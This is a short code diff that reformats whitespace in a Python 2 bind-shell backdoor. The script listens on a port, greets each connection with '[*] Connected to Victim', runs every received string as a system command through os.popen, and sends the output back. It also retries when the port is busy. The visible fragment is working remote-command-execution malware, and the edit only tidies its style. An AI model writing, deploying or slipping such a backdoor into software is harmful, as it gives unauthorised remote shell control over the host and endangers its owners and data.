@@ -23,8 +23,8 @@ while True:
                 s.listen(4)
                 while True:
                         c,addr = s.accept()
-                        c.send("[*] Connected to Victim [ %s : %s ] Successfully\n"%(addr[0],port))
-                        for tym in range(0,50):
+                        c.send("[*] Connected to Victim [ %s : %s ] Successfully\n" % (addr[0], port))
+                        for tym in range(0, 50):
                                 data=c.recv(1024)
                                 for line in os.popen(data):
                                         c.send(line)
@@ -33,7 +33,7 @@ while True:
                 s.close()
                 sys.exit(1)
         except socket.error:
-                print "\n\t[error] Address { %s : %s } already in use."%(host,port)
+                print "\n\t[error] Address { %s : %s } already in use." % (host, port)
                 print "\t[error] just wait a bit until we correct it for you."
                 s.close()
                 print "\n\ntrying again ...."
